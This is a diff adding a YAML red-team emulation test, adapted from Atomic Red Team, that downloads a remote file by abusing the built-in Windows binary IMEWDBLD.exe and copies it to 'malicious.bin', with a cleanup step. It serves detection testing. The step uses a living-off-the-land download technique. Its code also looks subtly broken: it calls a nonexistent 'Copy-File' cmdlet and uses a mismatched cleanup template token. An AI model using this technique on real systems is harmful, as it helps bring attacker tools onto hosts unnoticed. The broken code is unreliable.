@@ -1,0 +1,55 @@
+# Adapted from Atomic Red Team - Ingress Tool Transfer
+# Source: https://www.atomicredteam.io/atomic-red-team/atomics/T1105
+# Original auto_generated_guid: 1a02df58-09af-4064-a765-0babe1a0d1e2
+
+---
+api_version: 2.0
+uuid: 8c94f849-5ebe-41b2-a472-a97fce82facf
+name: Download a file with IMEWDBLD.exe
+authors:
+  - isaac_fletcher
+  - Atomic Red Team
+description: |
+  Use IMEWDBLD.exe (built-in to windows) to download a file. This will throw an error for an invalid dictionary file.
+  Downloaded files can be found in "%LocalAppData%\Microsoft\Windows\INetCache\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>" or `%LocalAppData%\Microsoft\Windows\INetCache\IE\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>.
+  Run "Get-ChildItem -Path C:\Users\<USERNAME>\AppData\Local\Microsoft\Windows\INetCache\ -Include <FILENAME>* -Recurse -Force -File -ErrorAction SilentlyContinue" without quotes and adding the correct username and file name to locate the file.
+
+mitre:
+  tactics:
+    - "TA0011 Command and Control"
+  techniques:
+    - "T1105 Ingress Tool Transfer"
+
+requirements:
+  platforms:
+    - os: windows
+
+args:
+  - name: remote_file
+    description: URL of file to copy
+    type: string
+    default: "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/dd526047b8c399c312fee47d1e6fb531164da54d/LICENSE.txt"
+  - name: local_file
+    description: Local file path to save downloaded file
+    type: path
+    default: "C:\\Users\\Public\\malicious.bin"
+
+steps:
+  - name: download_with_imewdbld
+    executor: powershell
+    inline: |
+      $imewdbled = $env:SystemRoot + "\System32\IME\SHARED\IMEWDBLD.exe"
+      & $imewdbled {{.Args.remote_file}}
+
+      $inetcache = $env:LOCALAPPDATA + "\Microsoft\Windows\INetCache\IE\"
+      $downloadedFile = Get-ChildItem -Path $inetcache -Recurse -Force -File -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending | Select-Object -First 1
+      if ($downloadedFile) {
+        Write-Output "$($downloadedFile.FullName)"
+        Copy-File "$($downloadedFile.FullName)" "{{.Args.local_file}}" -Force
+      }
+    outputvar: downloaded_file
+    cleanup:
+      executor: powershell
+      inline: |
+        Remove-Item -ErrorAction Ignore {[{.StepVars.downloaded_file}]} -Force
+        Remove-Item -ErrorAction Ignore {{.Args.local_file}} -Force
